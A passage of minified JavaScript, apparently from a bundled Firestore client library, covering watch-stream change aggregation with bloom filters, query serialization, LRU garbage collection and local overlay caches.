l=this.ye(n,i,r);this.be(l)}}be(e){const t=Math.floor(e/8),n=e%8;this.bitmap[t]|=1<<n}}class Sd extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}class tg{constructor(e,t,n,i,r){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=n,this.documentUpdates=i,this.resolvedLimboDocuments=r}static createSynthesizedRemoteEventForCurrentChange(e,t,n){const i=new Map;return i.set(e,Sp.createSynthesizedTargetChangeForCurrentChange(e,t,n)),new tg(Ke.min(),i,new Wa(da),Wo(),pa())}}class Sp{constructor(e,t,n,i,r){this.resumeToken=e,this.current=t,this.addedDocuments=n,this.modifiedDocuments=i,this.removedDocuments=r}static createSynthesizedTargetChangeForCurrentChange(e,t,n){return new Sp(n,t,pa(),pa(),pa())}}class Of{constructor(e,t,n,i){this.Se=e,this.removedTargetIds=t,this.key=n,this.De=i}}class rw{constructor(e,t){this.targetId=e,this.Ce=t}}class lw{constructor(e,t,n=Ut.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=t,this.resumeToken=n,this.cause=i}}class u2{constructor(){this.ve=0,this.Fe=d2(),this.Me=Ut.EMPTY_BYTE_STRING,this.xe=!1,this.Oe=!0}get current(){return this.xe}get resumeToken(){return this.Me}get Ne(){return this.ve!==0}get Be(){return this.Oe}Le(e){e.approximateByteSize()>0&&(this.Oe=!0,this.Me=e)}ke(){let e=pa(),t=pa(),n=pa();return this.Fe.forEach(((i,r)=>{switch(r){case 0:e=e.add(i);break;case 2:t=t.add(i);break;case 1:n=n.add(i);break;default:Ge(38017,{changeType:r})}})),new Sp(this.Me,this.xe,e,t,n)}Ke(){this.Oe=!1,this.Fe=d2()}qe(e,t){this.Oe=!0,this.Fe=this.Fe.insert(e,t)}Ue(e){this.Oe=!0,this.Fe=this.Fe.remove(e)}$e(){this.ve+=1}We(){this.ve-=1,Aa(this.ve>=0,3241,{ve:this.ve})}Qe(){this.Oe=!0,this.xe=!0}}class hU{constructor(e){this.Ge=e,this.ze=new Map,this.je=Wo(),this.He=vf(),this.Je=vf(),this.Ze=new Wa(da)}Xe(e){for(const t of e.Se)e.De&&e.De.isFoundDocument()?this.Ye(t,e.De):this.et(t,e.key,e.De);for(const t of e.removedTargetIds)this.et(t,e.key,e.De)}tt(e){this.forEachTarget(e,(t=>{const n=this.nt(t);switch(e.state){case 0:this.rt(t)&&n.Le(e.resumeToken);break;case 1:n.We(),n.Ne||n.Ke(),n.Le(e.resumeToken);break;case 2:n.We(),n.Ne||this.removeTarget(t);break;case 3:this.rt(t)&&(n.Qe(),n.Le(e.resumeToken));break;case 4:this.rt(t)&&(this.it(t),n.Le(e.resumeToken));break;default:Ge(56790,{state:e.state})}}))}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.ze.forEach(((n,i)=>{this.rt(i)&&t(i)}))}st(e){const t=e.targetId,n=e.Ce.count,i=this.ot(t);if(i){const r=i.target;if(a0(r))if(n===0){const l=new Be(r.path);this.et(t,l,Ht.newNoDocument(l,Ke.min()))}else Aa(n===1,20013,{expectedCount:n});else{const l=this._t(t);if(l!==n){const u=this.ut(e),d=u?this.ct(u,e,l):1;if(d!==0){this.it(t);const p=d===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ze=this.Ze.insert(t,p)}}}}}ut(e){const t=e.Ce.unchangedNames;if(!t||!t.bits)return null;const{bits:{bitmap:n="",padding:i=0},hashCount:r=0}=t;let l,u;try{l=Zs(n).toUint8Array()}catch(d){if(d instanceof MI)return sl("Decoding the base64 bloom filter in existence filter failed ("+d.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw d}try{u=new PE(l,i,r)}catch(d){return sl(d instanceof Sd?"BloomFilter error: ":"Applying bloom filter failed: ",d),null}return u.ge===0?null:u}ct(e,t,n){return t.Ce.count===n-this.Pt(e,t.targetId)?0:2}Pt(e,t){const n=this.Ge.getRemoteKeysForTarget(t);let i=0;return n.forEach((r=>{const l=this.Ge.ht(),u=`projects/${l.projectId}/databases/${l.database}/documents/${r.path.canonicalString()}`;e.mightContain(u)||(this.et(t,r,null),i++)})),i}Tt(e){const t=new Map;this.ze.forEach(((r,l)=>{const u=this.ot(l);if(u){if(r.current&&a0(u.target)){const d=new Be(u.target.path);this.It(d).has(l)||this.Et(l,d)||this.et(l,d,Ht.newNoDocument(d,e))}r.Be&&(t.set(l,r.ke()),r.Ke())}}));let n=pa();this.Je.forEach(((r,l)=>{let u=!0;l.forEachWhile((d=>{const p=this.ot(d);return!p||p.purpose==="TargetPurposeLimboResolution"||(u=!1,!1)})),u&&(n=n.add(r))})),this.je.forEach(((r,l)=>l.setReadTime(e)));const i=new tg(e,t,this.Ze,this.je,n);return this.je=Wo(),this.He=vf(),this.Je=vf(),this.Ze=new Wa(da),i}Ye(e,t){if(!this.rt(e))return;const n=this.Et(e,t.key)?2:0;this.nt(e).qe(t.key,n),this.je=this.je.insert(t.key,t),this.He=this.He.insert(t.key,this.It(t.key).add(e)),this.Je=this.Je.insert(t.key,this.Rt(t.key).add(e))}et(e,t,n){if(!this.rt(e))return;const i=this.nt(e);this.Et(e,t)?i.qe(t,1):i.Ue(t),this.Je=this.Je.insert(t,this.Rt(t).delete(e)),this.Je=this.Je.insert(t,this.Rt(t).add(e)),n&&(this.je=this.je.insert(t,n))}removeTarget(e){this.ze.delete(e)}_t(e){const t=this.nt(e).ke();return this.Ge.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}$e(e){this.nt(e).$e()}nt(e){let t=this.ze.get(e);return t||(t=new u2,this.ze.set(e,t)),t}Rt(e){let t=this.Je.get(e);return t||(t=new Et(da),this.Je=this.Je.insert(e,t)),t}It(e){let t=this.He.get(e);return t||(t=new Et(da),this.He=this.He.insert(e,t)),t}rt(e){const t=this.ot(e)!==null;return t||De("WatchChangeAggregator","Detected inactive target",e),t}ot(e){const t=this.ze.get(e);return t&&t.Ne?null:this.Ge.At(e)}it(e){this.ze.set(e,new u2),this.Ge.getRemoteKeysForTarget(e).forEach((t=>{this.et(e,t,null)}))}Et(e,t){return this.Ge.getRemoteKeysForTarget(e).has(t)}}function vf(){return new Wa(Be.comparator)}function d2(){return new Wa(Be.comparator)}const gU={asc:"ASCENDING",desc:"DESCENDING"},bU={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},vU={and:"AND",or:"OR"};class yU{constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function n0(a,e){return a.useProto3Json||Wh(e)?e:{value:e}}function gh(a,e){return a.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function cw(a,e){return a.useProto3Json?e.toBase64():e.toUint8Array()}function EU(a,e){return gh(a,e.toTimestamp())}function io(a){return Aa(!!a,49232),Ke.fromTimestamp((function(t){const n=Xs(t);return new Ua(n.seconds,n.nanos)})(a))}function LE(a,e){return i0(a,e).canonicalString()}function i0(a,e){const t=(function(i){return new Qa(["projects",i.projectId,"databases",i.database])})(a).child("documents");return e===void 0?t:t.child(e)}function uw(a){const e=Qa.fromString(a);return Aa(hw(e),10190,{key:e.toString()}),e}function o0(a,e){return LE(a.databaseId,e.path)}function Hv(a,e){const t=uw(e);if(t.get(1)!==a.databaseId.projectId)throw new ke(Se.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+t.get(1)+" vs "+a.databaseId.projectId);if(t.get(3)!==a.databaseId.database)throw new ke(Se.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+t.get(3)+" vs "+a.databaseId.database);return new Be(pw(t))}function dw(a,e){return LE(a.databaseId,e)}function SU(a){const e=uw(a);return e.length===4?Qa.emptyPath():pw(e)}function s0(a){return new Qa(["projects",a.databaseId.projectId,"databases",a.databaseId.database]).canonicalString()}function pw(a){return Aa(a.length>4&&a.get(4)==="documents",29091,{key:a.toString()}),a.popFirst(5)}function p2(a,e,t){return{name:o0(a,e),fields:t.value.mapValue.fields}}function CU(a,e){let t;if("targetChange"in e){e.targetChange;const n=(function(p){return p==="NO_CHANGE"?0:p==="ADD"?1:p==="REMOVE"?2:p==="CURRENT"?3:p==="RESET"?4:Ge(39313,{state:p})})(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],r=(function(p,f){return p.useProto3Json?(Aa(f===void 0||typeof f=="string",58123),Ut.fromBase64String(f||"")):(Aa(f===void 0||f instanceof Buffer||f instanceof Uint8Array,16193),Ut.fromUint8Array(f||new Uint8Array))})(a,e.targetChange.resumeToken),l=e.targetChange.cause,u=l&&(function(p){const f=p.code===void 0?Se.UNKNOWN:sw(p.code);return new ke(f,p.message||"")})(l);t=new lw(n,i,r,u||null)}else if("documentChange"in e){e.documentChange;const n=e.documentChange;n.document,n.document.name,n.document.updateTime;const i=Hv(a,n.document.name),r=io(n.document.updateTime),l=n.document.createTime?io(n.document.createTime):Ke.min(),u=new Yn({mapValue:{fields:n.document.fields}}),d=Ht.newFoundDocument(i,r,l,u),p=n.targetIds||[],f=n.removedTargetIds||[];t=new Of(p,f,d.key,d)}else if("documentDelete"in e){e.documentDelete;const n=e.documentDelete;n.document;const i=Hv(a,n.document),r=n.readTime?io(n.readTime):Ke.min(),l=Ht.newNoDocument(i,r),u=n.removedTargetIds||[];t=new Of([],u,l.key,l)}else if("documentRemove"in e){e.documentRemove;const n=e.documentRemove;n.document;const i=Hv(a,n.document),r=n.removedTargetIds||[];t=new Of([],r,i,null)}else{if(!("filter"in e))return Ge(11601,{Vt:e});{e.filter;const n=e.filter;n.targetId;const{count:i=0,unchangedNames:r}=n,l=new dU(i,r),u=n.targetId;t=new rw(u,l)}}return t}function TU(a,e){let t;if(e instanceof Ep)t={update:p2(a,e.key,e.value)};else if(e instanceof ow)t={delete:o0(a,e.key)};else if(e instanceof ml)t={update:p2(a,e.key,e.data),updateMask:DU(e.fieldMask)};else{if(!(e instanceof lU))return Ge(16599,{dt:e.type});t={verify:o0(a,e.key)}}return e.fieldTransforms.length>0&&(t.updateTransforms=e.fieldTransforms.map((n=>(function(r,l){const u=l.transform;if(u instanceof fh)return{fieldPath:l.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(u instanceof ap)return{fieldPath:l.field.canonicalString(),appendMissingElements:{values:u.elements}};if(u instanceof tp)return{fieldPath:l.field.canonicalString(),removeAllFromArray:{values:u.elements}};if(u instanceof hh)return{fieldPath:l.field.canonicalString(),increment:u.Ae};throw Ge(20930,{transform:l.transform})})(0,n)))),e.precondition.isNone||(t.currentDocument=(function(i,r){return r.updateTime!==void 0?{updateTime:EU(i,r.updateTime)}:r.exists!==void 0?{exists:r.exists}:Ge(27497)})(a,e.precondition)),t}function xU(a,e){return a&&a.length>0?(Aa(e!==void 0,14353),a.map((t=>(function(i,r){let l=i.updateTime?io(i.updateTime):io(r);return l.isEqual(Ke.min())&&(l=io(r)),new oU(l,i.transformResults||[])})(t,e)))):[]}function AU(a,e){return{documents:[dw(a,e.path)]}}function PU(a,e){const t={structuredQuery:{}},n=e.path;let i;e.collectionGroup!==null?(i=n,t.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=n.popLast(),t.structuredQuery.from=[{collectionId:n.lastSegment()}]),t.parent=dw(a,i);const r=(function(p){if(p.length!==0)return fw(co.create(p,"and"))})(e.filters);r&&(t.structuredQuery.where=r);const l=(function(p){if(p.length!==0)return p.map((f=>(function(E){return{field:uc(E.field),direction:IU(E.dir)}})(f)))})(e.orderBy);l&&(t.structuredQuery.orderBy=l);const u=n0(a,e.limit);return u!==null&&(t.structuredQuery.limit=u),e.startAt&&(t.structuredQuery.startAt=(function(p){return{before:p.inclusive,values:p.position}})(e.startAt)),e.endAt&&(t.structuredQuery.endAt=(function(p){return{before:!p.inclusive,values:p.position}})(e.endAt)),{ft:t,parent:i}}function LU(a){let e=SU(a.parent);const t=a.structuredQuery,n=t.from?t.from.length:0;let i=null;if(n>0){Aa(n===1,65062);const f=t.from[0];f.allDescendants?i=f.collectionId:e=e.child(f.collectionId)}let r=[];t.where&&(r=(function(h){const E=mw(h);return E instanceof co&&VI(E)?E.getFilters():[E]})(t.where));let l=[];t.orderBy&&(l=(function(h){return h.map((E=>(function(A){return new mh(dc(A.field),(function(R){switch(R){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}})(A.direction))})(E)))})(t.orderBy));let u=null;t.limit&&(u=(function(h){let E;return E=typeof h=="object"?h.value:h,Wh(E)?null:E})(t.limit));let d=null;t.startAt&&(d=(function(h){const E=!!h.before,C=h.values||[];return new ph(C,E)})(t.startAt));let p=null;return t.endAt&&(p=(function(h){const E=!h.before,C=h.values||[];return new ph(C,E)})(t.endAt)),H5(e,i,l,r,u,"F",d,p)}function RU(a,e){const t=(function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return Ge(28987,{purpose:i})}})(e.purpose);return t==null?null:{"goog-listen-tags":t}}function mw(a){return a.unaryFilter!==void 0?(function(t){switch(t.unaryFilter.op){case"IS_NAN":const n=dc(t.unaryFilter.field);return vt.create(n,"==",{doubleValue:NaN});case"IS_NULL":const i=dc(t.unaryFilter.field);return vt.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const r=dc(t.unaryFilter.field);return vt.create(r,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const l=dc(t.unaryFilter.field);return vt.create(l,"!=",{nullValue:"NULL_VALUE"});case"OPERATOR_UNSPECIFIED":return Ge(61313);default:return Ge(60726)}})(a):a.fieldFilter!==void 0?(function(t){return vt.create(dc(t.fieldFilter.field),(function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";case"OPERATOR_UNSPECIFIED":return Ge(58110);default:return Ge(50506)}})(t.fieldFilter.op),t.fieldFilter.value)})(a):a.compositeFilter!==void 0?(function(t){return co.create(t.compositeFilter.filters.map((n=>mw(n))),(function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return Ge(1026)}})(t.compositeFilter.op))})(a):Ge(30097,{filter:a})}function IU(a){return gU[a]}function wU(a){return bU[a]}function jU(a){return vU[a]}function uc(a){return{fieldPath:a.canonicalString()}}function dc(a){return Ot.fromServerFormat(a.fieldPath)}function fw(a){return a instanceof vt?(function(t){if(t.op==="=="){if(ZA(t.value))return{unaryFilter:{field:uc(t.field),op:"IS_NAN"}};if(XA(t.value))return{unaryFilter:{field:uc(t.field),op:"IS_NULL"}}}else if(t.op==="!="){if(ZA(t.value))return{unaryFilter:{field:uc(t.field),op:"IS_NOT_NAN"}};if(XA(t.value))return{unaryFilter:{field:uc(t.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:uc(t.field),op:wU(t.op),value:t.value}}})(a):a instanceof co?(function(t){const n=t.getFilters().map((i=>fw(i)));return n.length===1?n[0]:{compositeFilter:{op:jU(t.op),filters:n}}})(a):Ge(54877,{filter:a})}function DU(a){const e=[];return a.fields.forEach((t=>e.push(t.canonicalString()))),{fieldPaths:e}}function hw(a){return a.length>=4&&a.get(0)==="projects"&&a.get(2)==="databases"}function gw(a){return!!a&&typeof a._toProto=="function"&&a._protoValueType==="ProtoValue"}class Bs{constructor(e,t,n,i,r=Ke.min(),l=Ke.min(),u=Ut.EMPTY_BYTE_STRING,d=null){this.target=e,this.targetId=t,this.purpose=n,this.sequenceNumber=i,this.snapshotVersion=r,this.lastLimboFreeSnapshotVersion=l,this.resumeToken=u,this.expectedCount=d}withSequenceNumber(e){return new Bs(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new Bs(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new Bs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new Bs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}class MU{constructor(e){this.yt=e}}function NU(a){const e=LU({parent:a.parent,structuredQuery:a.structuredQuery});return a.limitType==="LAST"?t0(e,e.limit,"L"):e}class _U{constructor(){this.Sn=new qU}addToCollectionParentIndex(e,t){return this.Sn.add(t),ve.resolve()}getCollectionParents(e,t){return ve.resolve(this.Sn.getEntries(t))}addFieldIndex(e,t){return ve.resolve()}deleteFieldIndex(e,t){return ve.resolve()}deleteAllFieldIndexes(e){return ve.resolve()}createTargetIndexes(e,t){return ve.resolve()}getDocumentsMatchingTarget(e,t){return ve.resolve(null)}getIndexType(e,t){return ve.resolve(0)}getFieldIndexes(e,t){return ve.resolve([])}getNextCollectionGroupToUpdate(e){return ve.resolve(null)}getMinOffset(e,t){return ve.resolve($s.min())}getMinOffsetFromCollectionGroup(e,t){return ve.resolve($s.min())}updateCollectionGroup(e,t,n){return ve.resolve()}updateIndexEntries(e,t){return ve.resolve()}}class qU{constructor(){this.index={}}add(e){const t=e.lastSegment(),n=e.popLast(),i=this.index[t]||new Et(Qa.comparator),r=!i.has(n);return this.index[t]=i.add(n),r}has(e){const t=e.lastSegment(),n=e.popLast(),i=this.index[t];return i&&i.has(n)}getEntries(e){return(this.index[e]||new Et(Qa.comparator)).toArray()}}const m2={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},bw=41943040;class hn{static withCacheSize(e){return new hn(e,hn.DEFAULT_COLLECTION_PERCENTILE,hn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,t,n){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=n}}hn.DEFAULT_COLLECTION_PERCENTILE=10,hn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,hn.DEFAULT=new hn(bw,hn.DEFAULT_COLLECTION_PERCENTILE,hn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),hn.DISABLED=new hn(-1,0,0);class Mc{constructor(e){this.sr=e}next(){return this.sr+=2,this.sr}static _r(){return new Mc(0)}static ar(){return new Mc(-1)}}const f2="LruGarbageCollector",kU=1048576;function h2([a,e],[t,n]){const i=da(a,t);return i===0?da(e,n):i}class OU{constructor(e){this.Pr=e,this.buffer=new Et(h2),this.Tr=0}Ir(){return++this.Tr}Er(e){const t=[e,this.Ir()];if(this.buffer.size<this.Pr)this.buffer=this.buffer.add(t);else{const n=this.buffer.last();h2(t,n)<0&&(this.buffer=this.buffer.delete(n).add(t))}}get maxValue(){return this.buffer.last()[0]}}class UU{constructor(e,t,n){this.garbageCollector=e,this.asyncQueue=t,this.localStore=n,this.Rr=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.Ar(6e4)}stop(){this.Rr&&(this.Rr.cancel(),this.Rr=null)}get started(){return this.Rr!==null}Ar(e){De(f2,`Garbage collection scheduled in ${e}ms`),this.Rr=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,(async()=>{this.Rr=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(t){Hc(t)?De(f2,"Ignoring IndexedDB error during garbage collection: ",t):await Vc(t)}await this.Ar(3e5)}))}}class zU{constructor(e,t){this.Vr=e,this.params=t}calculateTargetCount(e,t){return this.Vr.dr(e).next((n=>Math.floor(t/100*n)))}nthSequenceNumber(e,t){if(t===0)return ve.resolve(Jh.ce);const n=new OU(t);return this.Vr.forEachTarget(e,(i=>n.Er(i.sequenceNumber))).next((()=>this.Vr.mr(e,(i=>n.Er(i))))).next((()=>n.maxValue))}removeTargets(e,t,n){return this.Vr.removeTargets(e,t,n)}removeOrphanedDocuments(e,t){return this.Vr.removeOrphanedDocuments(e,t)}collect(e,t){return this.params.cacheSizeCollectionThreshold===-1?(De("LruGarbageCollector","Garbage collection skipped; disabled"),ve.resolve(m2)):this.getCacheSize(e).next((n=>n<this.params.cacheSizeCollectionThreshold?(De("LruGarbageCollector",`Garbage collection skipped; Cache size ${n} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),m2):this.gr(e,t)))}getCacheSize(e){return this.Vr.getCacheSize(e)}gr(e,t){let n,i,r,l,u,d,p;const f=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next((h=>(h>this.params.maximumSequenceNumbersToCollect?(De("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${h}`),i=this.params.maximumSequenceNumbersToCollect):i=h,l=Date.now(),this.nthSequenceNumber(e,i)))).next((h=>(n=h,u=Date.now(),this.removeTargets(e,n,t)))).next((h=>(r=h,d=Date.now(),this.removeOrphanedDocuments(e,n)))).next((h=>(p=Date.now(),lc()<=ua.DEBUG&&De("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${l-f}ms
	Determined least recently used ${i} in `+(u-l)+`ms
	Removed ${r} targets in `+(d-u)+`ms
	Removed ${h} documents in `+(p-d)+`ms
Total Duration: ${p-f}ms`),ve.resolve({didRun:!0,sequenceNumbersCollected:i,targetsRemoved:r,documentsRemoved:h}))))}}function BU(a,e){return new zU(a,e)}class FU{constructor(){this.changes=new pl((e=>e.toString()),((e,t)=>e.isEqual(t))),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,Ht.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();const n=this.changes.get(t);return n!==void 0?ve.resolve(n):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}class VU{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t}}class HU{constructor(e,t,n,i){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=n,this.indexManager=i}getDocument(e,t){let n=null;return this.documentOverlayCache.getOverlay(e,t).next((i=>(n=i,this.remoteDocumentCache.getEntry(e,t)))).next((i=>(n!==null&&Nd(n.mutation,i,bi.empty(),Ua.now()),i)))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next((n=>this.getLocalViewOfDocuments(e,n,pa()).next((()=>n))))}getLocalViewOfDocuments(e,t,n=pa()){const i=Jr();return this.populateOverlays(e,i,t).next((()=>this.computeViews(e,t,i,n).next((r=>{let l=Ed();return r.forEach(((u,d)=>{l=l.insert(u,d.overlayedDocument)})),l}))))}getOverlayedDocuments(e,t){const n=Jr();return this.populateOverlays(e,n,t).next((()=>this.computeViews(e,t,n,pa())))}populateOverlays(e,t,n){const i=[];return n.forEach((r=>{t.has(r)||i.push(r)})),this.documentOverlayCache.getOverlays(e,i).next((r=>{r.forEach(((l,u)=>{t.set(l,u)}))}))}computeViews(e,t,n,i){let r=Wo();const l=Md(),u=(function(){return Md()})();return t.forEach(((d,p)=>{const f=n.get(p.key);i.has(p.key)&&(f===void 0||f.mutation instanceof ml)?r=r.insert(p.key,p):f!==void 0?(l.set(p.key,f.mutation.getFieldMask()),Nd(f.mutation,p,f.mutation.getFieldMask(),Ua.now())):l.set(p.key,bi.empty())})),this.recalculateAndSaveOverlays(e,r).next((d=>(d.forEach(((p,f)=>l.set(p,f))),t.forEach(((p,f)=>u.set(p,new VU(f,l.get(p)??null)))),u)))}recalculateAndSaveOverlays(e,t){const n=Md();let i=new Wa(((l,u)=>l-u)),r=pa();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next((l=>{for(const u of l)u.keys().forEach((d=>{const p=t.get(d);if(p===null)return;let f=n.get(d)||bi.empty();f=u.applyToLocalView(p,f),n.set(d,f);const h=(i.get(u.batchId)||pa()).add(d);i=i.insert(u.batchId,h)}))})).next((()=>{const l=[],u=i.getReverseIterator();for(;u.hasNext();){const d=u.getNext(),p=d.key,f=d.value,h=$I();f.forEach((E=>{if(!r.has(E)){const C=nw(t.get(E),n.get(E));C!==null&&h.set(E,C),r=r.add(E)}})),l.push(this.documentOverlayCache.saveOverlays(e,p,h))}return ve.waitFor(l)})).next((()=>n))}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next((n=>this.recalculateAndSaveOverlays(e,n)))}getDocumentsMatchingQuery(e,t,n,i){return G5(t)?this.getDocumentsMatchingDocumentQuery(e,t.path):Q5(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,n,i):this.getDocumentsMatchingCollectionQuery(e,t,n,i)}getNextDocuments(e,t,n,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,n,i).next((r=>{const l=i-r.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,n.largestBatchId,i-r.size):ve.resolve(Jr());let u=$d,d=r;return l.next((p=>ve.forEach(p,((f,h)=>(u<h.largestBatchId&&(u=h.largestBatchId),r.get(f)?ve.resolve():this.remoteDocumentCache.getEntry(e,f).next((E=>{d=d.insert(f,E)}))))).next((()=>this.populateOverlays(e,p,r))).next((()=>this.computeViews(e,d,p,pa()))).next((f=>({batchId:u,changes:YI(f)})))))}))}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new Be(t)).next((n=>{let i=Ed();return n.isFoundDocument()&&(i=i.insert(n.key,n)),i}))}getDocumentsMatchingCollectionGroupQuery(e,t,n,i){const r=t.collectionGroup;let l=Ed();return this.indexManager.getCollectionParents(e,r).next((u=>ve.forEach(u,(d=>{const p=(function(h,E){return new Yh(E,null,h.explicitOrderBy.slice(),h.filters.slice(),h.limit,h.limitType,h.startAt,h.endAt)})(t,d.child(r));return this.getDocumentsMatchingCollectionQuery(e,p,n,i).next((f=>{f.forEach(((h,E)=>{l=l.insert(h,E)}))}))})).next((()=>l))))}getDocumentsMatchingCollectionQuery(e,t,n,i){let r;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,n.largestBatchId).next((l=>(r=l,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,n,r,i)))).next((l=>{r.forEach(((d,p)=>{const f=p.getKey();l.get(f)===null&&(l=l.insert(f,Ht.newInvalidDocument(f)))}));let u=Ed();return l.forEach(((d,p)=>{const f=r.get(d);f!==void 0&&Nd(f.mutation,p,bi.empty(),Ua.now()),Zh(t,p)&&(u=u.insert(d,p))})),u}))}}class GU{constructor(e){this.serializer=e,this.Nr=new Map,this.Br=new Map}getBundleMetadata(e,t){return ve.resolve(this.Nr.get(t))}saveBundleMetadata(e,t){return this.Nr.set(t.id,(function(i){return{id:i.id,version:i.version,createTime:io(i.createTime)}})(t)),ve.resolve()}getNamedQuery(e,t){return ve.resolve(this.Br.get(t))}saveNamedQuery(e,t){return this.Br.set(t.name,(function(i){return{name:i.name,query:NU(i.bundledQuery),readTime:io(i.readTime)}})(t)),ve.resolve()}}class QU{constructor(){this.overlays=new Wa(Be.comparator),this.Lr=new Map}getOverlay(e,t){return ve.resolve(this.overlays.get(t))}getOverlays(e,t){const n=Jr();return ve.forEach(t,(i=>this.getOverlay(e,i).next((r=>{r!==null&&n.set(i,r)})))).next((()=>n))}saveOverlays(e,t,n){return n.forEach(((i,r)=>{this.bt(e,t,r)})),ve.resolve()}removeOverlaysForBatchId(e,t,n){const i=this.Lr.get(n);return i!==void 0&&(i.forEach((r=>this.overlays=this.overlays.remove(r))),this.Lr.delete(n)),ve.resolve()}getOverlaysForCollection(e,t,n){const i=Jr(),r=t.length+1,l=new Be(t.child("")),u=this.overlays.getIteratorFrom(l);for(;u.hasNext();){const d=u.getNext().value,p=d.getKey();if(!t.isPrefixOf(p.path))break;p.path.length===r&&d.largestBatchId>n&&i.set(d.getKey(),d)}return ve.resolve(i)}getOverlaysForCollectionGroup(e,t,n,i){let r=new Wa(((p,f)=>p-f));const l=this.overlays.getIterator();for(;l.hasNext();){const p=l.getNext().value;if(p.getKey().getCollectionGroup()===t&&p.largestBatchId>n){let f=r.get(p.largestBatchId);f===null&&(f=Jr(),r=r.insert(p.largestBatchId,f)),f.set(p.getKey(),p)}}const u=Jr(),d=r.getIterator();for(;d.hasNext()&&(d.getNext().value.forEach(((p,f)=>u.set(p,f))),!(u.size()>=i)););return ve.resolve(u)}bt(e,t,n){const i=this.overlays.get(n.key);if(i!==null){const l=this.Lr.get(i.largestBatchId).delete(n.key);this.Lr.set(i.largestBatchId,l)}this.overlays=this.overlays.insert(n.key,new uU(t,n));let r=this.Lr.get(t);r===void 0&&(r=pa(),this.Lr.set(t,r)),this.Lr.set(t,r.add(n.key))}}class JU{constructor(){this.sessionToken=Ut.EMPTY_BYTE_STRING}getSessionToken(e){return ve.resolve(this.sessionToken)}setSessionToken(e,t){return this.sessionToken=t,ve.resolve()}}class RE{constructor(){this.kr=new Et(Rt.Kr),this.qr=new Et(Rt.Ur)}isEmpty(){return this.kr.isEmpty()}addReference(e,t){const n=new 